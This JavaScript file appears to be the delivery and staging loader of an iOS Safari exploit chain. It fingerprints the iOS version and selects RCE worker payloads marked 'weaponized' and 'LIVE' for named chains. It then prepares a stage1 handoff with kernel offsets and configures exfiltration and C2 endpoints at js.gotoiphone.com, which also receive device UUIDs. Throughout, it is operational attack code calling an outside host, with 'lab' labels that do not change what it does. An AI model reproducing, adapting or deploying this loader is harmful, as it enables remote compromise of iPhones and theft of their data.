try{var __labG=(typeof globalThis!=="undefined"?globalThis:null);if(__labG)__labG.__LAB_EXFIL_DOMAIN__="js.gotoiphone.com";}catch(e){}
var SERVER_LOG = false;//js.gotoiphone.com
let logStart = new Date().getTime();
let logEntryID = 0;
let __printBudget = 60;
let __printWindowStart = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
function labPageDir() {
    try {
        if (typeof location === 'undefined' || !location.origin || location.origin === 'null') return '';
        var path = String(location.pathname || '/');
        var last = path.split('/').pop() || '';
        if (last.indexOf('.') >= 0) path = path.slice(0, Math.max(0, path.lastIndexOf('/')));
        path = path.replace(/\/+$/, '');
        return String(location.origin).replace(/\/$/, '') + path;
    } catch (e) { return ''; }
}
function labJoin(base, fname) {
    base = String(base || '').replace(/\/+$/, '');
    var s = String(fname || ''), q = '', i = s.indexOf('?');
    if (i >= 0) { q = s.slice(i); s = s.slice(0, i); }
    s = s.replace(/^\/+/, '');
    if (!base) return s + q;
    return base + '/' + s + q;
}
var localHost = (function () {
    try {
        if (typeof window !== 'undefined' && window.__LAB_DELIVERY_HOST__)
            return String(window.__LAB_DELIVERY_HOST__).replace(/\/$/, '');
        var dir = labPageDir();
        if (dir) return dir;
        if (typeof location !== 'undefined' && location.origin && location.origin !== 'null')
            return location.origin.replace(/\/$/, '');
    } catch (e) {}
    return "";
})();
function resolveLabDeviceUUID() {
    let du = '';
    try {
        du = (typeof window !== 'undefined' && window.__LAB_DEVICE_UUID__) || '';
    } catch (e0) {}
    if (!du) {
        try { du = (typeof localStorage !== 'undefined' && localStorage.getItem('lab_device_uuid')) || ''; } catch (e1) {}
    }
    if (!du) {
        try {
            const m = (typeof document !== 'undefined' && document.cookie || '').match(/(?:^|; )lab_device_uuid=([^;]*)/);
            if (m) du = decodeURIComponent(m[1]);
        } catch (e2) {}
    }
    du = String(du || '').replace(/-/g, '').toUpperCase();
    if (du && /^[0-9A-F]{16,64}$/.test(du)) {
        try {
            if (typeof window !== 'undefined') window.__LAB_DEVICE_UUID__ = du;
        } catch (e3) {}
        return du;
    }
    return '';
}
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    // Mirror to console so frame.html can notify parent (progress/hold).
    try { console.log(out); } catch (eC) {}
    try {
        const s = String(x);
        if (/RCE success|Finished stage2|handoff ok|inside stage1|check_dlopen/i.test(s)) {
            if (window.parent && window.parent !== window) {
                window.parent.postMessage({ type: 'ds-stage', stage: 'worker', progress: 42, label: s.slice(0, 80) }, '*');
            }
        } else if (/stage1_failed|InterposeTupleAll wait timeout/i.test(s)) {
            if (window.parent && window.parent !== window) {
                window.parent.postMessage({ type: 'ds-stage', stage: 'worker', progress: 42, label: 'stage1_fail:' + s.slice(0, 60) }, '*');
            }
        }
    } catch (eP) {}
    // Server upload: errors only (progress = pe_stage GETs / console).
    const isErr = reportError || /stage1_failed|fatal|Failed RCE|fail(?:ed|ure)?|error|exception|timeout|abort|InterposeTupleAll wait timeout/i.test(String(x));
    if (!isErr) return;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    }
    if (dumphex) {
        obj.hex = 1
        obj.text = x
    }
    try {
        let du = '';
        try {
            du = resolveLabDeviceUUID();
        } catch (e0) {}
        if (du) {
            obj.deviceUUID = du;
            obj.device = du;
        }
        let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
        const xhr = new XMLHttpRequest();
        xhr.open("GET", labJoin(localHost || labPageDir(), "log.html") + "?" + req, true);
        if (du) {
            try { xhr.setRequestHeader('X-Device-UUID', du); } catch (e1) {}
        }
        xhr.send(null);
    } catch (e) {}
}
function redirect()
{
    // Safari-side grace ended â€” PE/exfil may still be running in mediaplaybackd.
    // Do NOT mark S6/100% here; only advance to late PE so the bar matches reality.
    // æˆåŠŸ/å¤±è´¥å‡ä¸è·³è½¬é¡µé¢ï¼ˆçˆ¶é¡µ index ä¿æŒä¸åŠ¨ï¼›iframe ä¹Ÿä¸è¿› done.htmlï¼‰ã€‚
    try {
        if (window.parent && window.parent !== window) {
            window.parent.postMessage({
                type: 'ds-stage',
                stage: 'pe',
                progress: 92,
                label: 'æ¬Šé™æå‡ Â· å¾Œå°æ”¶å°¾ä¸­'
            }, '*');
            window.parent.postMessage({
                type: 'ds-chain-settle',
                progress: 92,
                label: 'chain settle (no redirect)'
            }, '*');
        }
    } catch (e) {}
    try {
        print('redirect(): skip done.html (stay on current page)', false);
    } catch (e3) {}
}

function exfilGraceMs() {
    // Safari-only hold before done.html redirect. PE/C2 already live in MPD/SB â€”
    // not the c2_agent .done poll (removed). Keep a short settle, not 180s.
    return 10000;
}
function sleepMs(ms) {
    return new Promise(function (r) { setTimeout(r, ms); });
}
async function waitPeExfilGrace() {
    const total = exfilGraceMs();
    print('pe exfil grace begin ' + Math.round(total / 1000) + 's (safari redirect settle)');
    const step = 5000;
    let elapsed = 0;
    while (elapsed < total) {
        await sleepMs(step);
        elapsed += step;
        print('pe exfil grace ' + Math.round(elapsed / 1000) + 's / ' + Math.round(total / 1000) + 's');
    }
    print('pe exfil grace complete');
}
function isStage1RcePath(v) {
    // Worker-internal RCE via postMessage(stage1_rce) â†’ main() â†’ _aarw_main.
    // iOS 18.5+: dedicated workers (18.5 â†’ rce_worker_18.5.js).
    // iOS 18.4: page check_attempt + stage1 handoff into rce_worker_18.4.js.
    if (!v || !v.length) return false;
    if (v[0] > 18) return true;
    if (v[0] === 18 && (v[1] || 0) >= 5) return true;
    return false;
}
function isIos186Plus(v) {
    return isStage1RcePath(v);
}
function normalizeIosVersion(v) {
    if (!v || !v.length) return v;
    if (v[0] >= 19 || v[0] >= 26) {
        var minor = v[1] || 0;
        if (minor >= 7 || v[0] >= 26) return [18, 7].concat(v.slice(2));
        if (minor >= 6 || v[0] >= 19) return [18, 6].concat(v.slice(2));
        return [18, 5].concat(v.slice(2));
    }
    return v;
}
function versionParts(v) {
    return { maj: v[0], min: v[1] || 0, pat: v[2] || 0 };
}
function cmpVer(a, b) {
    for (var i = 0; i < 3; i++) {
        if (a[i] < b[i]) return -1;
        if (a[i] > b[i]) return 1;
    }
    return 0;
}
function inVerRange(v, lo, hi) {
    return cmpVer(v, lo) >= 0 && cmpVer(v, hi) <= 0;
}
function isPatchedVersion(v) {
    // DarkSword primary RCE patched on 18.7.3+; full chain closed by 26.3
    if (!v || !v.length) return false;
    if (v[0] === 18 && v[1] === 7 && (v[2] || 0) >= 3) return true;
    if (v[0] === 18 && (v[1] || 0) >= 8) return true;
    if (v[0] === 26 && (v[1] || 0) >= 3) return true;
    return false;
}

function ghostUsableGrade(v) {
    if (!v || !v.length) return 'RESEARCH';
    var maj = v[0], min = v[1] || 0, pat = v[2] || 0;
    if (maj === 26 && min >= 3) return 'DEAD';
    if (maj === 26 && min === 2) return 'DEAD';
    if (maj === 26 && min === 0) return 'RESEARCH_HIGH';
    if (maj === 26 && min === 1) return 'RESEARCH';
    if (maj === 18 && min === 7 && pat >= 3) return 'DEAD';
    if (maj >= 19 && maj <= 25) return 'RESEARCH';
    return 'RESEARCH';
}

function classifyTarget(v) {
    if (!v || !v.length) {
        return { chain: 'unknown', delivery_ok: false, ghostwave: false, version_str: 'unknown', reason: 'no iOS version', patched: false };
    }
    var version_str = v.join('.');
    var p = [v[0], v[1] || 0, v[2] || 0];

    // Prefer server band plan when frame already fetched /api/chain-targets
    try {
        if (typeof window !== 'undefined' && window.__LAB_BAND__) {
            var b = window.__LAB_BAND__;
            if (b.chain) {
                return {
                    chain: b.chain,
                    delivery_ok: b.delivery_ok !== false,
                    ghostwave: b.chain === 'ghostwave',
                    version_str: version_str,
                    reason: b.next_action || b.notes || b.confidence || '',
                    patched: b.usable_grade === 'DEAD' || b.cve_tier === 'fully_patched_26_3',
                    weaponized: !!b.weaponized,
                    usable_grade: b.usable_grade || '',
                    open_cves: b.open_cves || [],
                    cve_tier: b.cve_tier || '',
                    research_priority: b.research_priority,
                    warning: b.weaponized ? '' : 'honesty: not weaponized'
                };
            }
        }
    } catch (eBand) {}

    if (inVerRange(p, [13, 0, 0], [17, 2, 1])) {
        return {
            chain: 'coruna',
            delivery_ok: true,
            ghostwave: false,
            version_str: version_str,
            reason: 'Coruna leaked kit (khanhduytran0/coruna) via /coruna/group.html',
            patched: false,
            weaponized: true,
            usable_grade: 'LIVE'
        };
    }

    if (cmpVer(p, [17, 2, 1]) > 0 && cmpVer(p, [18, 4, 0]) < 0) {
        var silk17 = p[0] === 17;
        return {
            chain: 'silkpath',
            delivery_ok: true,
            ghostwave: false,
            version_str: version_str,
            reason: silk17
                ? 'SilkPath loader OK but 17.x offsets are 0x0 â€” RCE gated by silkpath_loader'
                : 'SilkPath 18.0-18.3 Stage1 + provisional bridged offsets (22E)',
            patched: false,
            weaponized: !silk17,
            usable_grade: silk17 ? 'GATED' : 'PROVISIONAL'
        };
    }

    if (inVerRange(p, [18, 4, 0], [18, 7, 2])) {
        return {
            chain: 'darksword',
            delivery_ok: true,
            ghostwave: (p[1] || 0) >= 7,
            version_str: version_str,
            reason: (p[1] || 0) >= 7 ? 'DarkSword+GhostWave post-exploit hooks' : 'DarkSword 18.4-18.7.2',
            patched: false,
            weaponized: true,
            usable_grade: 'LIVE'
        };
    }

    if (inVerRange(p, [18, 7, 3], [26, 3, 99])) {
        var grade = ghostUsableGrade(v);
        var fully = (p[0] === 26 && p[1] >= 3);
        return {
            chain: 'ghostwave',
            delivery_ok: true, // research delivery always allowed
            ghostwave: true,
            version_str: version_str,
            reason: fully
                ? 'iOS 26.3 fully patched (GTIG) â€” harness telemetry only'
                : (grade === 'RESEARCH_HIGH'
                    ? 'GhostWave RESEARCH_HIGH â€” attempt 26.x worker + calibrate'
                    : 'GhostWave research â€” offsets/chain incomplete'),
            patched: grade === 'DEAD',
            weaponized: false,
            usable_grade: grade,
            warning: 'Do not treat GhostWave as production-ready'
        };
    }

    if (cmpVer(p, [26, 3, 99]) > 0) {
        return {
            chain: 'out_of_scope',
            delivery_ok: false,
            ghostwave: false,
            version_str: version_str,
            reason: 'above GhostWave 26.3',
            patched: true,
            usable_grade: 'DEAD'
        };
    }

    return {
        chain: 'out_of_scope',
        delivery_ok: false,
        ghostwave: false,
        version_str: version_str,
        reason: 'out of scope',
        patched: false,
        usable_grade: 'DEAD'
    };
}
function pickWorkerFile(v) {
    var raw = v;
    if (!raw || !raw.length) return null;
    try {
        if (typeof window !== 'undefined' && window.__LAB_RECOMMENDED_WORKER__) {
            return String(window.__LAB_RECOMMENDED_WORKER__);
        }
    } catch (e) {}
    if (raw[0] === 26 && (raw[1] || 0) >= 3) return 'rce_worker_26.3.js';
    if (raw[0] >= 19 || raw[0] >= 26) return 'rce_worker_26.x.js';
    v = normalizeIosVersion(v);
    if (v[0] !== 18) return null;
    var min = v[1] || 0, pat = v[2] || 0;
    if (min === 7 && pat >= 3) return 'rce_worker_26.x.js';
    if (min >= 7) return 'rce_worker_18.7.js';
    if (min === 6) return 'rce_worker_18.6.js';
    // iOS 18.5: dedicated worker (stage1_rce â†’ sbx0, 22F76).
    if (min === 5) return 'rce_worker_18.6.js'; // nui verified: 22F76 lives in 18.6 worker
    // iOS 18.4.x: page check_attempt â†’ stage1 handoff into 18.4 worker.
    if (min === 4) return 'rce_worker_18.4.js';
    return null;
}
function safariVersionMajor() {
    try {
        const m = /Version\/(\d+)/.exec(navigator.userAgent);
        return m ? parseInt(m[1], 10) : 0;
    } catch (e) { return 0; }
}
function workerFallbackChain(v) {

    var primary = pickWorkerFile(v);
    if (!primary) return [];
    if (!v || !v.length) return [primary];
    var min = v[1] || 0;
    var pat = v[2] || 0;



    // iOS 18.5: dedicated 18.5 worker; fall back to 18.6 then legacy 18.4.
    if (v[0] === 18 && min === 5) {
        return ['rce_worker_18.6.js', 'rce_worker_18.5.js', 'rce_worker_18.4.js'];
    }
    // iOS 18.4.x: must stay on 18.4 worker (stage1 handoff consumes page offsets).
    if (v[0] === 18 && min === 4) {
        return ['rce_worker_18.4.js'];
    }

    try {
        if (typeof window !== 'undefined' && window.__LAB_FALLBACK_WORKERS__ && window.__LAB_FALLBACK_WORKERS__.length) {
            var chain = [];
            if (primary) chain.push(primary);
            for (var i = 0; i < window.__LAB_FALLBACK_WORKERS__.length; i++) {
                var w = window.__LAB_FALLBACK_WORKERS__[i];
                if (w && chain.indexOf(w) < 0) chain.push(w);
            }
            if (chain.length) return chain;
        }
    } catch (eApi) {}
    if (!primary) return [];
    
    // iOS 26.3+: dedicated harness (fully patched)
    if (v[0] === 26 && (v[1] || 0) >= 3) {
        return ['rce_worker_26.3.js', 'rce_worker_26.x.js'];
    }

    // iOS 18.7+: prioritize 18.7 worker first (proven 2026-06-14: 18.7 S1 ok in 290ms)
    if (v[0] >= 19 || (v[0] === 18 && min >= 7)) {
        // For 18.7.0-18.7.2, prioritize 18.7 worker first
        if (v[0] === 18 && min === 7 && pat <= 2) {
            return ['rce_worker_18.7.js', 'rce_worker_26.x.js', 'rce_worker_18.6.js'];
        }
        // For 18.7.3+, try 26.x first as it might have better coverage
        if (v[0] === 18 && min === 7 && pat >= 3) {
            return ['rce_worker_26.x.js', 'rce_worker_18.7.js', 'rce_worker_18.6.js'];
        }
        // For iOS 19+ or Safari 26.0-26.2, try 26.x first
        return ['rce_worker_26.x.js', 'rce_worker_18.7.js', 'rce_worker_18.6.js'];
    }
    
    // iOS 18.6.x: single worker only (upstream / nuih). No 18.5/18.4 fallback â€”
    // those use different handoff paths and crash-skip would just burn attempts.
    if (v[0] === 18 && min === 6) {
        return ['rce_worker_18.6.js'];
    }
    
    // Default fallback chain (prefer files present in this lab tree)
    return [primary, 'rce_worker_18.6.js', 'rce_worker_18.5.js', 'rce_worker_18.4.js'];
}
function pickModuleFile(v) {
    var raw = v;
    v = normalizeIosVersion(v);
    if (!v || !v.length) return 'rce_module.js';
    if (raw[0] >= 19 || raw[0] >= 26) return 'rce_module_18.7.js';
    if (v[0] === 18 && (v[1] || 0) >= 7) return 'rce_module_18.7.js';
    if (v[0] === 18 && (v[1] || 0) === 6) return 'rce_module_18.6.js';
    if (v[0] === 18 && (v[1] || 0) === 5) return 'rce_module_18.6.js';
    // iOS 18.4.x: classic module + check_attempt handoff.
    if (v[0] === 18 && (v[1] || 0) === 4) return 'rce_module.js';
    return 'rce_module.js';
}
function moduleForWorker(workerFile) {
    if (!workerFile) return pickModuleFile(ios_version);
    if (workerFile.indexOf('26.3') >= 0) return ''; // harness â€” no RCE module
    if (workerFile.indexOf('26.x') >= 0 || workerFile.indexOf('18.7') >= 0) return 'rce_module_18.7.js';
    if (workerFile.indexOf('18.6') >= 0) return 'rce_module_18.6.js';
    if (workerFile.indexOf('18.5') >= 0) return 'rce_module_18.5.js';
    if (workerFile.indexOf('18.4') >= 0) return 'rce_module.js';
    return 'rce_module.js';
}
function workerMinBytes(candidate) {
    if (!candidate) return 5000;
    if (candidate.indexOf('26.3') >= 0) return 400;
    return candidate.indexOf('18.4') >= 0 ? 1000 : 5000;
}
//
// function parseIosVersion() {
//     try {
//         if (typeof window !== 'undefined' && window.__LAB_FORCE_IOS__) {
//             var forced = String(window.__LAB_FORCE_IOS__).split('.').map(function (p) { return parseInt(p, 10); }).filter(function (n) { return !isNaN(n); });
//             if (forced.length) return forced;
//         }
//         var q = new URLSearchParams(location.search);
//         var qi = q.get('ios') || q.get('version') || '';
//         if (qi) {
//             var fromQ = qi.split('.').map(function (p) { return parseInt(p, 10); }).filter(function (n) { return !isNaN(n); });
//             if (fromQ.length) return fromQ;
//         }
//     } catch (eF) {}
//     const ua = navigator.userAgent;
//     let m = /iPhone OS ([0-9_]+)/.exec(ua);
//     if (m) return m[1].split('_').map(function (p) { return parseInt(p, 10); });
//     m = /CPU (?:iPhone )?OS ([0-9_]+)/.exec(ua);
//     if (m) return m[1].split('_').map(function (p) { return parseInt(p, 10); });
//     m = /CPU OS ([0-9_]+)/.exec(ua);
//     if (m) return m[1].split('_').map(function (p) { return parseInt(p, 10); });
//     m = /Version\/(\d+)\.(\d+)/.exec(ua);
//     if (m) return [parseInt(m[1], 10), parseInt(m[2], 10)];
//     return null;
// }
function parseIosVersion() {
    // 1. æµ‹è¯•å¼ºåˆ¶ç‰ˆæœ¬
    try {
        if (
            typeof window !== 'undefined' &&
            window.__LAB_FORCE_IOS__
        ) {
            var forced = String(window.__LAB_FORCE_IOS__)
                .split('.')
                .map(function (p) {
                    return parseInt(p, 10);
                })
                .filter(function (n) {
                    return !isNaN(n);
                });

            if (forced.length) {
                return forced;
            }
        }

        var q = new URLSearchParams(location.search);

        // å¦‚æžœè¿™æ˜¯ä½ ä¸“é—¨ç”¨äºŽæµ‹è¯•çš„å‚æ•°ï¼Œå¯ä»¥ä¿ç•™ã€‚
        // å»ºè®®ä¸è¦ä½¿ç”¨é€šç”¨çš„ ?version=ï¼Œå®¹æ˜“å’Œä¸šåŠ¡å‚æ•°å†²çªã€‚
        var qi = q.get('ios') || '';

        if (qi) {
            var fromQ = qi
                .split('.')
                .map(function (p) {
                    return parseInt(p, 10);
                })
                .filter(function (n) {
                    return !isNaN(n);
                });

            if (fromQ.length) {
                return fromQ;
            }
        }
    } catch (e) {}


    var ua = navigator.userAgent || '';



    // iPhone / iPad / iPod
    // ç¬¬äºŒç§æƒ…å†µç”¨äºŽ iPad Desktop Mode
    var isIOS =
        /iPhone|iPad|iPod/i.test(ua) ||
        (
            navigator.platform === 'MacIntel' &&
            navigator.maxTouchPoints > 1
        );

    if (!isIOS) {
        return null;
    }


    // ------------------------------------------------
    // A. èŽ·å– UA ä¸­å£°æ˜Žçš„ iOS ç‰ˆæœ¬
    //
    // iOS 18:
    // CPU iPhone OS 18_7 like Mac OS X
    //
    // æŸäº› iOS 26 æµè§ˆå™¨:
    // CPU iPhone OS 26_1_0 like Mac OS X
    // ------------------------------------------------

    var osVersion = null;

    var osMatch =
        /(?:iPhone\s+)?OS\s+(\d+(?:[._]\d+){0,2})/i.exec(ua);

    if (osMatch) {
        osVersion = osMatch[1]
            .split(/[._]/)
            .map(function (p) {
                return parseInt(p, 10);
            });
    }


    // ------------------------------------------------
    // B. å¦‚æžœ OS å­—æ®µè‡ªå·±å·²ç»æ˜¯ 26+
    //    ç›´æŽ¥ä½¿ç”¨ï¼Œä¸éœ€è¦æŽ¨æ–­
    // ------------------------------------------------

    if (
        osVersion &&
        osVersion.length &&
        osVersion[0] >= 26
    ) {
        return osVersion;
    }


    // ------------------------------------------------
    // C. Safari 26+
    //
    // ä¾‹å¦‚ï¼š
    //
    // CPU iPhone OS 18_7 like Mac OS X
    // Version/26.1
    // Mobile/...
    // Safari/604.1
    //
    // OS æ˜¯å†»ç»“å€¼
    // Version/26.1 æ˜¯ Safari ç‰ˆæœ¬
    //
    // iPhone/iPad ä¸Š Safari 26 å¯¹åº” iOS/iPadOS 26 ç³»åˆ—
    // ------------------------------------------------

    var isSafari =
        /Version\/[\d.]+/i.test(ua) &&
        /Safari\//i.test(ua) &&

        // æŽ’é™¤ä¸»è¦ç¬¬ä¸‰æ–¹ iOS æµè§ˆå™¨
        !/CriOS/i.test(ua) &&
        !/FxiOS/i.test(ua) &&
        !/EdgiOS/i.test(ua) &&
        !/OPiOS/i.test(ua);

    if (isSafari) {
        var safariMatch =
            /Version\/(\d+)(?:\.(\d+))?(?:\.(\d+))?/i.exec(ua);

        if (safariMatch) {
            var major = parseInt(safariMatch[1], 10);
            var minor = parseInt(safariMatch[2] || '0', 10);

            // åªåœ¨ Safari 26+ æ—¶ä½¿ç”¨è¿™ä¸ªç‰¹æ®Šè§„åˆ™
            //
            // Safari 18 ä¸èµ°è¿™é‡Œï¼Œæ‰€ä»¥ä¸ä¼šæŠŠæ­£å¸¸çš„
            // iOS 18.x åˆ¤æ–­é€»è¾‘ç ´åæŽ‰ã€‚
            if (major >= 26) {
                if (safariMatch[3] != null) {
                    return [
                        major,
                        minor,
                        parseInt(safariMatch[3], 10)
                    ];
                }

                return [
                    major,
                    minor
                ];
            }
        }
    }


    // ------------------------------------------------
    // D. iOS 26 ä»¥ä¸‹ç»§ç»­ä½¿ç”¨çœŸå®ž OS å­—æ®µ
    // ------------------------------------------------

    if (osVersion) {
        return osVersion;
    }


    return null;
}
function resolveDeliveryHost() {
    function preferPublicHttps(h) {
        h = String(h || '').replace(/\/$/, '');
        if (!h) return h;
        try {
            var origin = h;
            var path = '';
            var m = h.match(/^(https?:\/\/[^\/]+)(\/.*)?$/i);
            if (m) { origin = m[1]; path = m[2] || ''; }
            var hostOnly = origin.replace(/^https?:\/\//, '').split(':')[0];
            if (/:8080$/i.test(origin) || hostOnly === '192.168.1.29' || /^\d+\.\d+\.\d+\.\d+$/.test(hostOnly)) {
                return ('https://js.gotoiphone.com:80' + path).replace(/\/$/, '');
            }
            return (origin + path).replace(/\/$/, '');
        } catch (ePref) {}
        return h;
    }
    if (localHost && localHost.length > 4) return preferPublicHttps(localHost);
    try {
        if (typeof window !== 'undefined' && window.__LAB_DELIVERY_HOST__)
            return preferPublicHttps(window.__LAB_DELIVERY_HOST__);
        var dir = labPageDir();
        if (dir) return preferPublicHttps(dir);
        if (typeof location !== 'undefined' && location.origin && location.origin !== 'null')
            return preferPublicHttps(location.origin);
    } catch (e) {}
    return labPageDir() || 'https://js.gotoiphone.com:80';
}
function resolveExfilTarget() {
    try {
        if (typeof window !== 'undefined' && window.__LAB_EXFIL__ && window.__LAB_EXFIL__.host)
            return window.__LAB_EXFIL__;
    } catch (e) {}
    // try {
    //     const base = resolveDeliveryHost();
    //     if (!base) return null;
    //     const xhr = new XMLHttpRequest();
    //     xhr.open('GET', base + '/api/chain-targets', false);
    //     xhr.send(null);
    //     if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText) {
    //         const d = JSON.parse(xhr.responseText);
    //         if (d.exfil && d.exfil.host) return d.exfil;
    //     }
    // } catch (e) {}
    try {
        const base = resolveDeliveryHost();
        const h = base.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
        if (!h) return null;
        // C2/exfil is on a dedicated domain, separate from JS delivery host.
        return { host: "js.gotoiphone.com", http_port: 443, https_port: 443, tls: false };
    } catch (e) {}
    return { host: "js.gotoiphone.com", http_port: 443, https_port: 443, tls: false };
}
function exfilFields() {
    const t = resolveExfilTarget();
    let deviceUUID = '';
    try {
        deviceUUID = resolveLabDeviceUUID();
    } catch (eDu) { deviceUUID = ''; }
    if (!t) {
        return {
            exfilHost: 'js.gotoiphone.com',
            exfilHttpPort: 8018,
            exfilHttpsPort: 8018,
            exfilTls: false,
            exfilFallbackHost: 'js.gotoiphone.com',
            exfilFallbackHttpPort: 8018,
            deviceUUID,
        };
    }
    // Prefer explicit GitHub-style IP:4001 from /api/chain-targets
    const hostRaw = String(t.host || '').replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    const isIp = /^\d+\.\d+\.\d+\.\d+$/.test(hostRaw);
    if (isIp || t.prefer_https === false || t.tls === false || (t.http_port && Number(t.http_port) === 4001)) {
        const ip = isIp ? hostRaw : 'js.gotoiphone.com';
        return {
            exfilHost: ip,
            exfilHttpPort: t.http_port != null ? Number(t.http_port) : 4001,
            exfilHttpsPort: t.https_port != null ? Number(t.https_port) : 4001,
            exfilTls: false,
            exfilFallbackHost: ip,
            exfilFallbackHttpPort: 8018,
            statsUrl: t.stats_url_direct || t.stats_url || ('http://' + ip + ':4001/stats'),
            deviceUUID,
        };
    }
    if (t.stats_url) {
        try {
            const u = new URL(t.stats_url);
            const port = u.port ? parseInt(u.port, 10) : (u.protocol === 'https:' ? 443 : 80);
            return {
                exfilHost: u.hostname,
                exfilHttpPort: port,
                exfilHttpsPort: port,
                exfilTls: u.protocol === 'https:',
                statsUrl: t.stats_url,
                exfilFallbackHost: 'js.gotoiphone.com',
                exfilFallbackHttpPort: 8018,
                deviceUUID,
            };
        } catch (e) { /* fall through */ }
    }
    const host = hostRaw;
    const tls = t.tls === true || t.prefer_https === true;
    return {
        exfilHost: host,
        exfilHttpPort: t.http_port != null ? t.http_port : (tls ? 443 : 4001),
        exfilHttpsPort: t.https_port != null ? t.https_port : (tls ? 443 : 4001),
        exfilTls: tls,
        exfilFallbackHost: 'js.gotoiphone.com',
        exfilFallbackHttpPort: 8018,
        statsUrl: t.delivery_stats_url || '',
        deviceUUID,
    };
}
function ensureBody() {
    if (document.body) return document.body;
    var b = document.createElement('body');
    if (document.documentElement) document.documentElement.appendChild(b);
    return b;
}
function iosVersionKey(v) {
    if (!v) return '';
    if (typeof v === 'string') {
        if (v.indexOf('.') >= 0) return v.replace(/\./g, ',');
        return v;
    }
    if (v.join) return v.join(',');
    return String(v);
}
function validateStage1Handoff() {
    if (!device_model) {
        print('handoff reject: missing device_model', true);
        return false;
    }
    if (!offsets || typeof offsets !== 'object') {
        print('handoff reject: missing offsets object', true);
        return false;
    }
    var keys = Object.keys(offsets);
    if (keys.length < 40) {
        print('handoff reject: offsets too small (' + keys.length + ' keys)', true);
        return false;
    }
    if (slide == null || slide === undefined) {
        print('handoff reject: missing slide', true);
        return false;
    }
    try {
        if (typeof slide === 'bigint' && slide === 0n) {
            print('handoff reject: zero slide', true);
            return false;
        }
    } catch (e) {}
    print('handoff ok: ' + device_model + ' keys=' + keys.length + ' slide=' + (slide && slide.toString ? slide.toString() : slide));
    return true;
}
function packOffsetsForTransfer(src) {
    var out = {};
    if (!src) return out;
    try {
        for (var k in src) {
            if (!Object.prototype.hasOwnProperty.call(src, k)) continue;
            var val = src[k];
            out[k] = (val != null && val.toString) ? val.toString() : String(val);
        }
    } catch (e) {}
    return out;
}
function postStage1ToWorker(worker, begin, origin, desiredHost) {
    var msg = {
        type: 'stage1',
        begin: begin,
        origin: origin,
        ios_version: iosVersionKey(ios_version),
        device_model: device_model,
        chipset: chipset,
        slide: (slide != null && slide.toString) ? slide.toString() : '0',
        offsets: packOffsetsForTransfer(offsets),
        desiredHost: desiredHost,
        SERVER_LOG: SERVER_LOG
    };
    try {
        var ex = exfilFields();
        for (var ek in ex) { if (Object.prototype.hasOwnProperty.call(ex, ek)) msg[ek] = ex[ek]; }
    } catch (e) {}
    try { msg._enc_pass = labEncPassword(); } catch (eP) {}
    try {
        worker.postMessage(msg);
        print('stage1 handoff posted (' + (msg.device_model || '?') + ', ' + Object.keys(msg.offsets).length + ' offsets)');
        return true;
    } catch (e) {
        print('stage1 postMessage failed: ' + e, true);
        return false;
    }
}
function labEncPassword() {
    try {
        if (typeof globalThis !== 'undefined' && globalThis.__LAB_ENC_PASS__)
            return String(globalThis.__LAB_ENC_PASS__);
        if (typeof window !== 'undefined' && window.__LAB_ENC_PASS__)
            return String(window.__LAB_ENC_PASS__);
    } catch (e) {}
    return '9898asd147258';
}

function decryptWireText(text){return text;}

function getJS(fname, method = 'GET', tries = 5)
{
    try
    {
        const clean = String(fname).replace(/^\//, '').split('?')[0];
        const base = resolveDeliveryHost();
        if (!base) { print('getJS: no delivery host'); return; }
        const path = labJoin(base, fname);
        const sep = path.indexOf('?') >= 0 ? '&' : '?';
        for (let attempt = 1; attempt <= tries; attempt++) {
            const url = path + sep + '_r=' + attempt;
            let xhr = new XMLHttpRequest();
            xhr.open(method, url, false);
            xhr.send(null);
            if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText && xhr.responseText.length > 0) {
                return xhr.responseText;
            }
            // 404/410 won't appear on retry â€” fail fast instead of 5Ã— spam.
            if (xhr.status === 404 || xhr.status === 410) {
                print('getJS HTTP ' + xhr.status + ' for ' + fname + ' (no retry)');
                return;
            }
            if (attempt < tries) {
                print('getJS retry ' + attempt + '/' + tries + ' HTTP ' + xhr.status + ' for ' + fname);
            }
        }
        print('getJS HTTP failed for ' + fname);
    }
    catch (e)
    {
        print('getJS error: ' + e);
    }
}

var __gwDecryptReady = false;

async function ensureGhostWaveDecrypt(){return true;}

async function fetchEncryptedJS(){return null;}

async function resolveWorkerCode(candidate){return getJS(candidate+'?'+Date.now());}

function shouldUseEncryptedStagingSync(){return false;}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        // Close existing bitmap â€” this triggers a dyld dlopen path through
        // ImageIO/CG framework processing on most iOS versions.
        try { globalThis[1].close(); } catch(_) {}
        // Immediately create a fresh bitmap so the NEXT close() is also
        // meaningful.  Without this, retrigger_dlopen1 closes an already-
        // closed bitmap (no-op) and no dlopen happens on the retry.
        try {
          var _c2 = new OffscreenCanvas(1, 1);
          createImageBitmap(_c2).then(function(_b2) { globalThis[1] = _b2; });
        } catch(_e2) {}
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = parseIosVersion();
const chain_target = classifyTarget(ios_version);
const worker_plan = workerFallbackChain(ios_version);
var __exfilBoot = exfilFields();
print('chain_boot: ios=' + (ios_version ? ios_version.join('.') : 'unknown')
    + ' safari=' + safariVersionMajor()
    + ' chain=' + chain_target.chain
    + ' workers=' + (worker_plan.length ? worker_plan.join('>') : 'none')
    + ' host=' + resolveDeliveryHost()
    + ' exfil=' + (__exfilBoot.exfilHost || '?') + ':' + (__exfilBoot.exfilHttpPort || '?')
    + ' tls=' + !!__exfilBoot.exfilTls);
print('ios_version: ' + (ios_version ? ios_version.join('.') : 'unknown'));
